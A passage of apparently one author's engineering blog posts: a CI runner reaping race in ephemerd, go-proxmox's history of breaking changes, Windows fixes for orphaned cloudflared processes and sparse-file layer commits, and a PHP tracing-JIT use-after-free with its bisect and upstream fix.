23:39:33 queued 556, 551, 567 23:39:34 JIT runner vivid_heisenberg (intent 551) 23:39:35 JIT runner warm_ride (intent 556) 23:39:35 JIT runner slim_mayer (intent 567) 23:39:41.967 in_progress 556 -> vivid_heisenberg # sets started[556] 23:39:41.967 in_progress 567 -> slim_mayer 23:39:45.368 vivid_heisenberg exits (556 done) 23:39:48.403 completed 567 -> handleCompleted -> sweepOrphanRunners() 23:39:48.403 "retiring discharged runner" runner=warm_ride dispatched_for_job=556 23:39:48.403 "destroying runner environment" id=warm_ride 23:39:50.716 in_progress 551 -> warm_ride # 2.3s too late 23:49:42 completed 551 -> failure GitHub gave job 556 to vivid_heisenberg and job 551 (the docker-build) to warm_ride. When in_progress 556 arrived it set started[556]. And 556 was warm_ride’s intent. So as far as the ledger was concerned, warm_ride was:
unbound, because its own in_progress hadn’t been processed yet discharged, because a sibling had started the job it was dispatched for in a class with zero demand, because three runners served three jobs That’s the surplus rule exactly. The sweep runs on every job completion, and slim_mayer finished at 23:39:48. warm_ride was destroyed 2.3 seconds before the webhook that would have bound it. The window is just the skew between in_progress deliveries of the same burst. A few hundred milliseconds is enough.
The fix: rules nominate, reality vetoes #151 (8d6a288) keeps all the sweep logic but takes away its authority. The rules now produce nominations. Nothing is torn down until a check confirms no job is running. That check is made at the moment of teardown, from ground truth rather than event history. The invariant is in the PR title: never destroy a runner that is executing a job.
Ground truth turned out to be simple. The Actions runner’s listener process lives for the runner’s whole life. But it only forks a Runner.Worker child while a job is executing. So “is there a Runner.Worker in there” is the question. Every platform has a way to ask it:
Runner lives in Probe Linux container (runc) task.Pids(), then argv[0] from /proc Windows Hyper-V container hcsshim ProcessList(), since guest processes are invisible to the host macOS VM pgrep -x Runner.Worker over the existing SSH channel Linux VM on a Windows/macOS host not available, falls through to the GitHub API When the local probe can’t answer, the fallback is GET .../actions/runners/{id} and its busy flag. That’s only for runners already nominated. A 404 means not busy, since an ephemeral runner deregisters when its job ends. Any other error is “unknown”. The zero value of the verdict type is Unknown, so nothing can accidentally read as idle.
The decision itself is a pure function, which made it easy to test as a matrix:
func decideReap(in reapInput) reapDecision { age := in.Now.Sub(in.DispatchedAt) if age >= in.Policy.HardBound && in.Busy != runnerbusy.Idle { return reapDecision{Destroy: true, Escape: true, Outcome: outcomeEscaped, Reason: "wedged: still not idle past the hard bound"} } switch in.Busy { case runnerbusy.Idle: return reapDecision{Destroy: true, Outcome: outcomeReaped, Reason: "verified idle: no worker process on the runner"} case runnerbusy.Busy: return reapDecision{Outcome: outcomeVetoed, Reason: "vetoed: the runner is executing a job"} default: if age >= in.Policy.Grace { return reapDecision{Destroy: true, Escape: true, Outcome: outcomeEscaped, Reason: "busy state undeterminable for the whole grace window"} } return reapDecision{Outcome: outcomeVetoed, Reason: "vetoed: busy state could not be determined"} } } There are two escape hatches, both based on time. An “unknown” verdict is held only for the grace window. That’s exactly the old behavior, so no platform got worse. A positive “busy” verdict is only overridden past job_timeout + 30m. By then the job’s context has been cancelled anyway, and a runner still claiming to be busy is wedged.
I went back and forth on time versus “N failed probes in a row”. The sweep runs on every completion. On a busy node a probe-count escape would fire within milliseconds, in exactly the same-label burst this exists to survive. On a quiet node it would practically never fire. Wedged-ness is a property of duration, so duration bounds it.
The probes do I/O, so they run with the scheduler lock released. That opens a window for an in_progress to bind a runner mid-probe. Before unhooking anything, teardown re-validates under the lock that it’s the same binding and still unbound.
Proving it on the node that broke I deployed a test build to the same node. I set the orphan grace to 5 seconds so the rules would nominate aggressively. Then I fed it a stream of same-label dind-test jobs:
01:19:58.039 orphan sweep nomination vetoed runner=steady_hopper busy_verdict=busy probe=container 01:19:58.371 in_progress -> steady_hopper (+332ms) 01:20:26.213 orphan sweep nomination vetoed runner=sure_darwin busy_verdict=busy probe=container 01:20:26.976 in_progress -> sure_darwin (+763ms) 01:20:41.179 orphan sweep nomination vetoed runner=sure_sagan busy_verdict=busy probe=container 01:20:41.786 in_progress -> sure_sagan (+607ms) Three nominations, each a fraction of a second before the in_progress that would have protected it. That’s the same race that killed warm_ride. All three were vetoed and all three jobs passed. In the same window a genuinely idle runner was still reaped, so the veto isn’t a blanket:
ephemerd_orphan_reap_decisions_total{outcome="vetoed",verdict="busy"} 3 ephemerd_orphan_reap_decisions_total{outcome="reaped",verdict="idle"} 1 ephemerd_orphan_reap_decisions_total{outcome="escaped",...} 0 It isn’t perfect, and I’d rather say so. That idle runner got its in_progress 1.37 seconds after it was reaped. GitHub had assigned it a job, but the worker hadn’t forked yet, so the probe correctly said idle. The re-provision path picked the job back up and nothing was lost. But the busy check shrinks the window to the gap between “GitHub assigns” and “the worker spawns”. It doesn’t close it. Covering that last sub-second is what the grace window is still for. It only came into play here because the test ran with a 5-second grace instead of the 10-minute default.
Same lesson, twice more Two later bugs were the same mistake in different clothes.
The Mac node served zero macOS jobs for about 28 hours (#197). The whole time it reported status: ok, active_jobs: 0 and a 200 from /healthz. A wedged VM was force-stopped to reclaim its slot, and the guest ignored the stop. The code then waited forever on a channel whose comment assumed the stop always works. The slot was never released. Nothing in the health output looked at whether jobs were moving.
Then on 2026-10-05 the Windows node ran about 10 real jobs in a day (#210). Meanwhile it booted about 23 runners for jobs GitHub had already finished or cancelled, some three days earlier. The scheduler decided “already ran” from an in-memory started map that expires. But a dispatch could wait on a slot with no time limit. So the fix asks the platform before acting on a stale decision:
// JobAwaitingRunner reports whether the job is still waiting for a runner // to pick it up. false means it is running elsewhere, finished, or gone. // An error means "could not determine" — callers must fail OPEN and // provision anyway, because a skipped live job is worse than one wasted // runner. JobAwaitingRunner(ctx context.Context, event *JobEvent) (bool, error) For GitHub that’s one GET /repos/{owner}/{repo}/actions/jobs/{id}. It only happens when the dispatch waited for its slot. A dispatch that got a slot immediately is acting on a webhook that’s seconds old and skips the call. Slot waits are now capped at 6 hours too. A job that’s still queued gets re-dispatched by the reconcile poll anyway.
Webhooks are hints Every one of these bugs came from treating the event history as the state of the world. Webhooks arrive out of order and arrive late. They describe a moment that’s already gone by the time you act on them. That’s fine for deciding what to try. Anything destructive needs a source of truth to check right before acting. So does anything that burns a scarce slot for 90 minutes. That could be a process table, the forge’s API, or whatever is closest to reality. Make the cheap event-driven logic nominate, and let reality veto.
Links ephemerd (PRs #131 and #151 have the full journals) #197 macOS slot release #210 stop provisioning runners for jobs that no longer exist docs/arch/webhook-job-lifecycle.md GitHub: just-in-time runners

title: Breaking Changes Without Breaking Trust: Five Years to go-proxmox v0.8
description: I measured five years of go-proxmox releases and found a broken tag that can never be deleted, a release that didn't compile and 285 breaking changes in v0.7.0. This is that history and the rule I follow now.
body:
go-proxmox had its first commit in June 2021 and v0.8.2 went out on September 30th. In between there were 366 commits and 43 people besides me with a merged PR. More to the point of this post, there are downstream projects that I don’t control pinning it in their go.mod. IONOS’s Cluster API provider and Sidero’s Omni Proxmox provider are both on v0.8.1 today. A library with users like that gets judged less on its API. It gets judged more on what happens to their build when they bump the version. I didn’t always get that right, so here is the history, measured.
What apidiff says apidiff compares the exported API of two versions of a package. It sorts every difference into compatible (additions) and incompatible (anything that can break a caller). I ran it across every pair of consecutive releases from the last beta to v0.8.2:
The 285 at v0.7.0 is the planned one, and I’ll get to it. The ones that bother me more are the small numbers in places they shouldn’t be. v0.2.3 was a patch release with seven incompatible changes in it:
- (*Client).UpdateACL: changed from func(context.Context, ACL) error to func(context.Context, ACLOptions) error - (*Container).NewFirewallIPSet: changed from func(context.Context, *FirewallIPSet) error to func(context.Context, FirewallIPSetCreationOption) error - (*Container).RRDData: changed from func(context.Context, Timeframe, ConsolidationFunction) ([]*RRDData, error) to func(context.Context, Timeframe, ...ConsolidationFunction) ([]*RRDData, error) - (*Node).Networks: changed from func(context.Context) (NodeNetworks, error) to func(context.Context, ...string) (NodeNetworks, error) - (*VirtualMachine).ResizeDisk: changed from func(context.Context, string, string) error to func(context.Context, string, string) (*Task, error) - CPUInfo.Mode: removed - NodeNetwork.Active: changed from int to StringOrInt Every one of those was a good change. ResizeDisk should return the task. UpdateACL was sending the wrong parameters and never worked. But anyone who ran go get -u on a patch release got compile errors. v0.4.1 did it again with VNet.Tag going from uint16 to uint32. On a v0 module semver technically allows all of this. That isn’t the same thing as it being fine.
A year and a half of alphas and betas For a long time the answer to “when is the next release” was a tag like v0.0.0-alpha7. There were ten alphas and six betas between January 2023 and March 2024. The API moved under all of them. In March 2024 someone opened #138 “Release v0.1.0”. I said I thought we were there. Then nothing happened for almost three months. The IONOS folks asked again because their Cluster API provider needed a tagged release. My reply was “ah no sorry… i just forgot. ill do it now”. That’s the honest version of how a lot of small open source releases work. It’s a bad experience for the people downstream.
Then in October 2024 came #167: “Release v0.2.0 is tagged with v0.1.2”. I’d made the GitHub release with the wrong tag name. I deleted the tag and created the right one. I said “there, v0.2.0 is created and v0.1.2 is deleted” and closed the issue. It is not deleted. The Go module proxy caches every version it has ever been asked for, and it was asked:
$ curl -s https://proxy.golang.org/github.com/luthermonson/go-proxmox/@v/v0.1.2.info {"Version":"v0.1.2","Time":"2024-10-03T23:58:17Z","Origin":{"VCS":"git","URL":"https://github.com/luthermonson/go-proxmox","Hash":"824e06bcfc27fd56c30a966a02a4582c77eaa09d","Ref":"refs/tags/v0.1.2"}} $ curl -s https://proxy.golang.org/github.com/luthermonson/go-proxmox/@v/v0.2.0.info {"Version":"v0.2.0","Time":"2024-10-03T23:58:17Z","Origin":{"VCS":"git","URL":"https://github.com/luthermonson/go-proxmox","Hash":"824e06bcfc27fd56c30a966a02a4582c77eaa09d","Ref":"refs/tags/v0.2.0"}} Same commit, two versions, forever. In this case it’s harmless because the code is identical. But a deleted Go tag is never really deleted. If a tag is wrong, the fix is a new version (and a retract directive in go.mod if it’s bad), not a delete.
And on New Year’s Eve 2025 I tagged v0.3.0 after merging a batch of PRs. Two of them were merged back to back. Each added a Node.Status method to the same file. It doesn’t compile:
# github.com/luthermonson/go-proxmox .\nodes.go:42:16: method Node.Status already declared at .\nodes.go:29:16 (That’s why the chart compares v0.3.1 to v0.2.4. apidiff can’t load v0.3.0.) Two people sent the same four-line fix on New Year’s Day and v0.3.1 went out that afternoon. A release that doesn’t build is about the most visible way to tell your users you didn’t run go build before tagging.
The shape argument Not every breaking change is an accident. The biggest design decision got argued about early. In March 2024 #137 made a good case against the handle style. client.Node(ctx, name) makes an API call to build the *Node. Then node.Version(ctx) makes a second one. A flat client.NodeVersion(ctx, name) would be one call. I argued that loading the node gives you a handle you reuse for everything after it. It also validates that the node exists, and you can always call client.Get directly. We disagreed politely, and the reporter went on to keep writing their own library. Both are reasonable designs.
I kept the handles, and in May this year doubled down on them. The rule in AGENTS.md is now that anything with an /{id}/ in its Proxmox path gets a getter that returns a handle without an API call. So node.CephOSD(id).Scrub(ctx, false) costs exactly one request. That’s partly an answer to #137 two years late. It also cost the biggest single break in the project’s history, because snapshots and firewall rules had shipped the other way for years.
The earliest compatibility decision was smaller and has held up better. #39 in January 2023 pointed out that Clone and MoveDisk had hardcoded arguments. They couldn’t express half of what the endpoints accept. Instead of adding more positional parameters, required arguments stay positional. Everything optional moves into an options struct you can pass as nil. Adding a field to an options struct is a compatible change. Adding a parameter is not. That pattern is why most endpoints have been able to grow without breaking anyone. v0.8.0’s only break was retrofitting it to VirtualMachine.Delete:
// before task, err := vm.Delete(ctx) // after — nil preserves the old default behaviour task, err := vm.Delete(ctx, nil) v0.6 to v0.8: doing the big break on purpose By May 2026 there was a pile of known-wrong things that could only be fixed by breaking the API:
snapshot and firewall rule methods that threaded IDs through the parent Net0..Net9 fields that couldn’t represent net10 about 30 config fields whose types let Go’s zero value overwrite Proxmox defaults another 25 booleans typed as Go bool that couldn’t express what Proxmox sends on the wire The choice was a trickle of breaks across several releases or one release that took all of them. v0.7.0 took all of them. That’s the 285.
What made it acceptable, I hope, is the migration guide. migration/v0.7.0.md groups the 285 lines into seven themes. Each has before and after code. There’s a TL;DR table of who is affected. It also has two sections I’d now put in every guide. One is “What didn’t change” (the wire format, NewClient with no options, the auth flow). The other is “What’s new (non-breaking)”. Nobody upgrading should have to read raw apidiff output to find out whether they’re affected.
It’s also a rule now. AGENTS.md says every release with at least one apidiff incompatible change ships a migration/v<VERSION>.md. It goes in the release PR, not retrofitted later. Here are the commands to check:
go install golang.org/x/exp/cmd/apidiff@latest git worktree add /tmp/old-version v<previous-version> cd /tmp/old-version && apidiff -w /tmp/old.api . cd <repo> && apidiff -w /tmp/new.api . apidiff -incompatible /tmp/old.api /tmp/new.api Releases with no incompatible changes don’t get a file. The directory is a record of breaks, not a ritual.
Deprecate, then remove v0.7.1 was a correctness release. It came from auditing every exported struct against the Proxmox and QEMU guest agent schemas (#337). It found JSON tags that had never matched anything:
"disallowed_leaders: " with a colon and a space inside the tag icmp_type where Proxmox uses icmp-type encryption where the key is encrypted My favorite is the firewall option Ntp. It shipped in v0.1.x and was always supposed to be NDP (IPv6 neighbor discovery). Those fields had never once been populated.
Where a fix was a pure tag change, it just shipped. Where it needed a rename, the old field stayed and got neutralized rather than deleted:
// NDP — Neighbor Discovery Protocol toggle (PVE default 1). Use this // field rather than Ntp; the upstream API field is `ndp`, not `ntp`. NDP IntOrBool `json:"ndp,omitempty"` // Deprecated: PVE never had an `ntp` firewall option — this was a typo // shipped since v0.1.x. The intended field is NDP (above). Setting Ntp // has no effect on PVE and reads always return zero. Will be removed in // v0.8.0. Ntp IntOrBool `json:"-"` Code that references .Ntp still compiles and gets a deprecation warning from linters. It reads the zero value it was always reading. That comment says it goes away in v0.8.0, and v0.8.2 still has it. That’s its own small lesson about putting version numbers in deprecation notices. It will go in the next release that has a migration guide anyway. Two fields on StorageContent couldn’t be handled that way. One was renamed and one retyped. That’s why v0.7.1 has a small migration file of its own.
What I’d tell myself in 2021 Tag real versions early. A v0.1.0 that you break in v0.2.0 is more useful to people than ten alphas. Never delete a pushed tag. The proxy already has it. Run go build ./... and apidiff before tagging. If a patch release shows incompatible changes, it’s a minor release. Optional parameters go in an options struct from day one. When a big break is coming, batch it and write the guide in the same PR. v0.8.2 was a docs example and a single code fix. VNC connections now notify the consumer and close cleanly when the VM on the other end stops. Zero incompatible changes. That’s the column I want to stay empty from here on.
How I measured I used apidiff from golang.org/x/exp/cmd/apidiff (installed with go install golang.org/x/exp/cmd/apidiff@latest). I ran it against each tag’s source extracted with git archive <tag> | tar -x. The steps were:
apidiff -w <tag>.api . per tag apidiff <prev>.api <tag>.api for each consecutive pair from v0.0.0-beta6 to v0.8.2 count the lines under “Incompatible changes” and “Compatible changes” v0.3.0 fails to type-check, so v0.3.1 is compared to v0.2.4. Windows 11, Go 1.26.5.
Links go-proxmox releases and migration guides #39 compatibility policy, #137 handles vs a flat client, #138 release v0.1.0, #167 mistagged release #227 the v0.3.0 build fix, #335 migration guide convention, #337 phantom JSON tags apidiff Go modules reference, retract

title: Windows Grab-Bag: SIGTERM That Doesn't Exist and Sparse Files That Break Docker
description: Go can't SIGTERM a child on Windows, so ephemerd's cloudflared processes piled up. Separately, Delivery Optimization's sparse temp files broke its Windows image layer commits.
body:
Two short ones from the Windows node of ephemerd from the last few weeks. Neither is complicated once you know what’s going on. Both took longer than they should have to find, because the failure showed up a long way from the cause.
Part 1: there is no SIGTERM on Windows ephemerd can run a Cloudflare tunnel so GitHub webhooks reach a node behind NAT. It does that by running cloudflared as a managed subprocess. On Linux the child is tied to ephemerd’s lifetime by the kernel with Pdeathsig:
func applyPdeathsig(cmd *exec.Cmd) { if cmd.SysProcAttr == nil { cmd.SysProcAttr = &syscall.SysProcAttr{} } cmd.SysProcAttr.Pdeathsig = syscall.SIGTERM cmd.SysProcAttr.Setpgid = true } If ephemerd exits for any reason (clean stop, panic, SIGKILL) the kernel sends cloudflared a SIGTERM. On Windows SysProcAttr has no Pdeathsig. The comment in the non-Linux file said the graceful Close() path was the sole shutdown mechanism there. Both the context-cancel hook and close() did the same thing, cmd.Process.Signal(syscall.SIGTERM):
cmd.Cancel = func() error { return cmd.Process.Signal(syscall.SIGTERM) } Go’s os.Process.Signal on Windows supports exactly one signal, os.Kill. Everything else returns an error. That error was logged at Debug and dropped. On top of that, every config push and every upgrade on that node stops the service. In practice each restart left a cloudflared behind. Measured on the node on 2026-09-22:
live ephemerd pid : 6908 children of live : 1 orphaned : 25 orphan parents still alive: 0 orphan RAM MB : 868 The oldest orphan was 13 days old. 868 MB of RAM is annoying but it’s not the real problem. All 25 were running the same tunnel config and holding live connections to Cloudflare’s edge:
Cloudflare load-balances incoming requests across every connection registered for a tunnel. 96 of the 100 connections belonged to processes whose ephemerd was gone. Most webhook deliveries were being handed to clients that had nowhere to forward them. That makes it the prime suspect for something I’d been chasing separately. The webhook listener on that node seemed to go deaf for hours after an upgrade.
Job Objects are Windows’ Pdeathsig The Windows answer is a Job Object with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE. Put the child in the job and hold the job handle. When the last handle closes, the kernel kills everything in it. A process’s handles close when it exits by any means. So this covers service stop, crash and taskkill the same way (#206):
func bindChildLifetime(cmd *exec.Cmd) (io.Closer, error) { job, err := windows.CreateJobObject(nil, nil) if err != nil { return nil, fmt.Errorf("cloudflared: create job object: %w", err) } info := windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION{ BasicLimitInformation: windows.JOBOBJECT_BASIC_LIMIT_INFORMATION{ LimitFlags: windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, }, } if _, err := windows.SetInformationJobObject(job, windows.JobObjectExtendedLimitInformation, uintptr(unsafe.Pointer(&info)), uint32(unsafe.Sizeof(info))); err != nil { _ = windows.CloseHandle(job) return nil, fmt.Errorf("cloudflared: set job limits: %w", err) } // OpenProcess rather than reusing the handle inside os.Process: that one is // owned by the runtime and closed when the Process is released, which would // make assignment racy against Wait. h, err := windows.OpenProcess(windows.PROCESS_SET_QUOTA|windows.PROCESS_TERMINATE, false, uint32(cmd.Process.Pid)) if err != nil { _ = windows.CloseHandle(job) return nil, fmt.Errorf("cloudflared: open child process: %w", err) } defer func() { _ = windows.CloseHandle(h) }() if err := windows.AssignProcessToJobObject(job, h); err != nil { _ = windows.CloseHandle(job) return nil, fmt.Errorf("cloudflared: assign to job object: %w", err) } return &jobHandle{h: job}, nil } Two small decisions in there. Closing the job is itself a guaranteed kill. So close() releases it after the graceful attempts rather than instead of them. That lets a clean shutdown close its edge connections properly. And if binding the job fails, ephemerd warns and keeps the tunnel running. A tunnel that might leak beats no tunnel. But it’s a Warn, not a Debug. It’s the difference between one stray process and one per restart forever.
The test is revert-verified. Reduce bindChildLifetime to the old no-op and it fails with “the child is unbound”.
Cleaning up the ones already running A Job Object only covers children this binary starts. It can’t adopt the 25 already running. Left alone they’d survive until a reboot. They weren’t idle either. Each one kept re-registering edge connections for the same tunnel, and past some count Cloudflare started refusing. The node was logging unknown error registering the connection about 300 times an hour. Meanwhile the live daemon limped along on 3 of its 4 connections. PR #207 adds a sweep at startup, before spawning:
for _, pid := range pids { if pid == 0 || pid == self { continue } path, ok := processImagePath(pid) if !ok || strings.ToLower(path) != want { continue } if parentPID(pid) == self { continue // our own child, not a stray } if err := killPID(pid); err != nil { log.Warn("could not kill stray cloudflared", "pid", pid, "error", err) continue } killed++ } The important line is the image path match. It only touches cloudflared running out of this ephemerd’s data directory, never by process name. Somebody’s own tunnel on the same box is safe. Killing an operator’s unrelated tunnel would be a worse bug than the leak.
Here’s what the errors did around the reap, from the hours recorded in the PR:
Testing this one had a trap I fell right into. To test an orphan reaper you need real orphans. If the test spawns cloudflared stand-ins directly, they’re the test process’s own children. The reaper deliberately skips those. My first version did exactly that and passed while proving nothing. The test now spawns them through a launcher that exits. That makes them genuine orphans. It’s revert-verified twice:
a no-op reaper fails with stray pid 41292 survived the reap matching on name instead of path fails with killed an unrelated cloudflared Part 2: sparse files and “unknown stream ID 9” The other one came from building a Windows CI image with the MSVC toolchain baked in. That way Windows jobs stop installing Visual Studio Build Tools every run. The build failed three times, for three different reasons:
the checkout was killed by an unrelated teardown incident on the node the shell-form RUN for the rustup step lost its double quotes to Windows command-line parsing before PowerShell ever saw them (#191) this one, which isn’t in my Dockerfile at all failed to commit ... during finalize: failed to reimport snapshot: Files/Windows/Temp/DO32B1.tmp: unknown stream ID 9 DO*.tmp in C:\Windows\Temp belongs to the Delivery Optimization service (DoSvc). That’s the thing that peer-to-peer distributes Windows updates. It runs inside Server Core containers and writes sparse temp files on its own schedule. When a layer commits, the Windows snapshotter serializes the layer with go-winio’s backuptar. That reads files through the Win32 backup stream API. Stream ID 9 is BACKUP_SPARSE_BLOCK. The go-winio in that stack (v0.6.2) rejects it in its layer-export pass with exactly that error. Upstream merged a fix for that path in September, but it isn’t in a tagged release yet. Until it is, whichever RUN step happens to be live when DoSvc drops a file loses its commit.
That’s why it was nondeterministic. Earlier runs committed the same steps fine. The failing step was a read-only verification RUN that didn’t write anything itself.
The fix (#192) is one early layer, right after SHELL. It turns the service off before anything else happens:
RUN Stop-Service DoSvc -Force -ErrorAction SilentlyContinue; ` Set-Service DoSvc -StartupType Disabled -ErrorAction SilentlyContinue; ` Remove-Item -Path 'C:\Windows\Temp\DO*.tmp' -Force -ErrorAction SilentlyContinue; ` Write-Host 'Delivery Optimization disabled (sparse DO*.tmp files break Windows layer commits)' Service start type is registry state, so it persists into every later layer. SilentlyContinue is on all of it, because a future base image without DoSvc should count as success. The cost was one rebuild of the cached Build Tools layer (about 25 minutes). That cache would have been poisoned by the same bug sooner or later anyway.
Say you build Windows images with BuildKit or containerd and see unknown stream ID 9. Look for a background service writing sparse files (and a go-winio without that September fix) before you look at your own steps.
The common thread Both of these were the platform quietly not doing what the code assumed. Signal(SIGTERM) returned an error into a debug log. A service I’d never heard of wrote a file type the layer archiver can’t handle. In both cases the fix was small and the expensive part was noticing.
Links #206 Job Object for cloudflared #192 disable DoSvc in the MSVC image Job Objects (Win32) WIN32_STREAM_ID and BACKUP_SPARSE_BLOCK microsoft/go-winio

title: An Upstream PHP JIT Use-After-Free, and Why Our Default Flipped Twice
description: ePHPm turned PHP's tracing JIT on by default, then off three days later when stock Laravel died after three requests. The bug was upstream, and this is the bisect, the root cause and where the fix landed.
body:
In August, ePHPm turned PHP’s tracing JIT on by default in single-site serve mode. Three days later it went back off on every platform, and it’s still off. The reason turned out to be a use-after-free in PHP’s tracing JIT that has nothing to do with ePHPm. Stock php -S with a stock Laravel skeleton dies on it in a couple of requests. The fix is now released upstream. So this seemed like the right time to write up how we got there, and what still has to happen before the default can flip again.
Flip one: on, because the numbers said so ePHPm had kept the JIT off since July for a measured reason. On our cpu.php benchmark, opcache.jit=tracing cost 17% RPS. That benchmark spends most of its time in the hash() builtin. JIT compiles PHP bytecode. When the hot code is a C builtin there’s nothing for it to compile, so the tracing overhead is pure cost.
Then the Windows performance work happened. MSVC-built PHP gets the slowest VM dispatch mode. On a pure-PHP CPU loop on my Ryzen 9 5950X, the JIT took a request from 5.56 ms to 2.33 ms. So ephpm#350 shipped a shaped default and not a global one:
Mode default single-site ephpm serve tracing multi-tenant (sites_dir) disable worker mode disable (pending a soak) ephpm dev off Multi-tenant stayed off because of a second measurement. Per-site opcache_invalidate() never reclaims JIT buffer. buffer_free doesn’t move. Only a full opcache_reset gets it back, and the hardening preset disables that. In a host where tenants deploy all day, the buffer would fill and the JIT would quietly stop compiling. There’s a knob ([php] opcache_jit = "tracing" | "function" | "disable"). There’s a startup line that says what the JIT is doing and why, plus two gauges for buffer size and free space.
The PR’s own risk section named the worst case of turning it on: “a JIT miscompile… a process-level SIGSEGV/access violation with no crash containment”. That’s what happened.
Flip two: off, because Laravel died after three requests ephpm#365 was a Windows release build serving a stock Laravel 13 app with the default config. It died with 0xC0000005 after exactly three requests. Deterministic. ePHPm logged nothing, because there’s no fatal-signal handler on Windows. The process just vanished.
It was found during an experiment with an in-memory code bundle. It got blamed on that experiment twice before the right control was run. With the bundle feature switched entirely off, it still crashed 3 out of 3. These are the controls that pinned it on the JIT:
opcache.jit=disable survived 150 requests every time. A unique opcache.cache_id didn’t help, so it wasn’t the OPcache ASLR collision from earlier that same day. It did look a lot like it. None of the ePHPm-side levers helped either. That covered one worker, the dedicated pool (which only delayed it to request 35), and a smaller JIT buffer. A crash dump symbolized to the same frames every time:
php8ts!zend_jit_escape_if_undef+0x103 <- mov rcx,qword ptr [rax+rcx*8+0D0h] php8ts!zend_jit_trace_deoptimization+0x500 php8ts!zend_jit_trace+0x961 php8ts!zend_jit_compile_side_trace+0x1c3 php8ts!zend_jit_trace_hot_side+0x47f php8ts!zend_jit_trace_exit+0x7fb 0x00001000`10000644 <- side exit out of JIT'd code Read it bottom-up. JIT-compiled code took a side exit and the exit got hot. So the JIT started compiling a side trace for it. While doing that it read through a pointer into an unmapped heap region. The faulting read is op_array->reserved[0], which is ZEND_FUNC_INFO(exit_info->op_array) in zend_jit_ir.c.
Bisecting it without ePHPm The fastest way to stop arguing about whose bug it is: take your own code out of the picture. I used the same Laravel app with official Windows x64 TS builds from php.net and plain php -S. The ini had OPcache and opcache.jit = tracing. Each cell was 150 requests in its own process. Every cell checked that opcache_get_status()['jit']['on'] was really true. My first pass had a false negative on 8.4. OPcache is a separate DLL there and I hadn’t loaded it.
PHP (Win x64 TS) requests served 8.4.14 150, clean 8.4.24 7, then 0xC0000005 8.5.0 150, clean 8.5.4 150, clean 8.5.5 1, then 0xC0000005 8.5.7 (our pinned SDK) 2, then 0xC0000005 8.5.9 (latest at the time) 2, then 0xC0000005 That window brackets one change on both branches. php-src#21368 was a fix for a JIT infinite loop. It merged to PHP-8.4 on March 16th and was first released in 8.4.20 and 8.5.5. There was already an open upstream fix attempt, php-src#21710 from Ilia Alshanetsky. It was chasing a crash another user had hit under IIS with FastCGI. Arnaud Le Blanc had posted the root cause there the week before.
The root cause When the tracing JIT creates an exit point, it records the op_array the trace was in. That way it can find the function’s metadata later. It took that pointer from the current call frame. Usually that’s the op_array in OPcache shared memory, which lives as long as the cache. Methods of a class whose parent isn’t in shared memory are different. Class linking copies the method’s op_array header to the request heap, and that copy is what’s on the frame. The copy is freed at request shutdown. The trace metadata lives on in shared memory.
So request 1 records a trace through such a method, and the exit point keeps a pointer to the heap copy. Request 2 takes that exit often enough to make it hot. The JIT compiles a side trace, follows exit_info->op_array, and reads freed memory. Whether that crashes depends on what the allocator did with the memory in between. That’s why the request count varies by version and app.
Why Windows first? Upstream’s guess matches what I saw. On Windows, linked classes miss the inheritance cache more often. But it’s not Windows-only. On Linux under ePHPm, 20,000 requests of stock Laravel were clean. Then one route linking a class whose parent wasn’t in shared memory died at request 2, five runs out of five. The same route under stock php -S on Linux died at request 2 too, on 8.5.7 and 8.4.23. And eval is just one way to get an uncached parent:
how the parent class is provided (stock php -S 8.5.7) result eval("class P {}") dies at request 2 ordinary file, OPcache-blacklisted dies at request 2 ordinary cached file 200/200 clean cached file, declared under if (!class_exists(...)) 200/200 clean Mock and proxy generators (PHPUnit, Mockery, ProxyManager) generate exactly this kind of class. So does an oversized or blacklisted parent file. So the exposure isn’t “apps that use eval”. It’s any app where some class extends a parent OPcache didn’t cache.
The default goes off everywhere ephpm#372 started as a Windows-only change. Re-testing the “Linux is an accepted risk” assumption is what produced the Linux numbers above. By the time it merged the default was disable on every platform. The startup line says why:
INFO ephpm: opcache JIT OFF — default since #365: PHP's tracing JIT (8.5.5+, and 8.4.24+) reads a freed op_array when it compiles a side trace in a later request and kills the process — no PHP error, no log line (php-src PR 21710, still open; reproduces on stock php too, on Linux and Windows alike). Set [php] opcache_jit = "function" for the unaffected JIT mode, or "tracing" to accept the risk The “8.4.24+” in that line undersells it. On the 8.4 branch the regression first shipped in 8.4.20.
Two other workarounds held in testing:
opcache.jit=function never builds traces, so it can’t get to this code. opcache.jit_hot_side_exit=0 keeps root traces and never compiles a side trace. I didn’t make the side-exit setting the default. The other reporter saw a different faulting site after changing JIT flags. That says the stale pointer can bite in more than one place. Turning off side traces also removes most of what the tracing JIT is worth anyway. "function" is documented as the middle setting for anyone who wants some JIT.
What it cost us is small. On the real Laravel app, the tracing JIT used about 0.3 MB of its 64 MB buffer over 20,000 requests. There’s just not much for it to compile in a request/response app. The big wins were on synthetic CPU loops. The failure mode is a silent process kill that takes every in-flight request with it. Easy call.
Upstream The Laravel reproduction and the bisect went onto php-src#21710 on August 22nd. That was mostly because it was a simpler repro than the existing ones. No IIS, no FastCGI, no pcntl_fork, just php.exe -S and a skeleton app dying in seconds. Ilia Alshanetsky committed the fix two hours later, “JIT: persist the SHM op_array in trace exit_info”:
exit_info.op_array was taken from the current frame. Methods of linked classes that miss the inheritance cache use a heap copy of the op_array header, so that pointer is invalid in other processes and later requests. Store the original from the JIT extension, as root traces already do.
The PR was closed as landed on August 24th. The fix shipped in PHP 8.4.26 and 8.5.11, tagged September 22nd and released on the 24th. I checked the release tags against the fix commit, and both contain it. Our php-sdk pipeline published 8.5.11 and 8.4.26 builds at the end of September.
For this post I also tried to build a toy reproducer to show 8.5.9 crashing and 8.5.11 not. It used an eval’d parent and a child class with a method that sees a different type each request. I couldn’t get the toy to crash on 8.5.9. The JIT debug output did show it compiling a side trace off the method’s root trace. My best guess is that the stale read happens but lands on memory that’s still mapped. The real apps crashed because their allocation pattern had reused or released that memory by the time the side trace compiled. That’s the nature of a use-after-free. It’s also why I’m not going to call the fix verified on our side until the Laravel cell from the table above runs clean on 8.5.11.
What has to happen before it flips a third time As of today ePHPm’s SDK pins are still 8.4.23 and 8.5.7. Both are affected, so the default stays disable. The comment on the reason enum already says to revisit “when php-src PR 21710 merges and the pinned SDK is bumped past it”. The first half is done. For the second half the bar is:
